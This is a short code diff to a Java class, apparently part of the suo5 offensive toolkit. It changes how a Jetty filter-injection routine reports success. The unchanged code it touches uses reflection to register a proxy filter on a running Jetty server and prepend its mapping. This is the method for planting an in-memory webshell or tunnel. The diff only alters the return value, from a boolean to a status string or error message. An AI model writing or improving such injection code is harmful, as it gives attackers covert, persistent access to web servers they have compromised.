@@ -56,9 +56,8 @@ public class Suo5JettyFilter extends ClassLoader implements InvocationHandler, R
 
                 }
             }
-            if (servletRequestFilterClass !=null){
-                addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass);
-                this.parameterMap.put("result", "ok".getBytes());
+            if (servletRequestFilterClass != null){
+                this.parameterMap.put("result", addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass).getBytes());
                 this.parameterMap = null;
             }
         }catch (Throwable e){
@@ -216,8 +215,7 @@ public class Suo5JettyFilter extends ClassLoader implements InvocationHandler, R
 
     }
 
-    private boolean addFilter(Object filter,Class filterClass) throws Throwable {
-        boolean isOk = false;
+    private String addFilter(Object filter, Class filterClass) throws Throwable {
         try {
             Object[] obj = getServers();
             for (int i = 0; i < obj.length; i++) {
@@ -236,17 +234,14 @@ public class Suo5JettyFilter extends ClassLoader implements InvocationHandler, R
 
                     servletHandler.getClass().getMethod("addFilter",filterHolderClass).invoke(servletHandler,filterHolder);
                     servletHandler.getClass().getMethod("prependFilterMapping",filterMappingClass).invoke(servletHandler,filterMapping);
-                    isOk = true;
-                }catch (Throwable e) {
+                } catch (Throwable e) {
 
                 }
             }
         } catch (Throwable e) {
-
+            return e.getMessage();
         }
-
-
-        return isOk;
+        return "ok";
     }
 
 
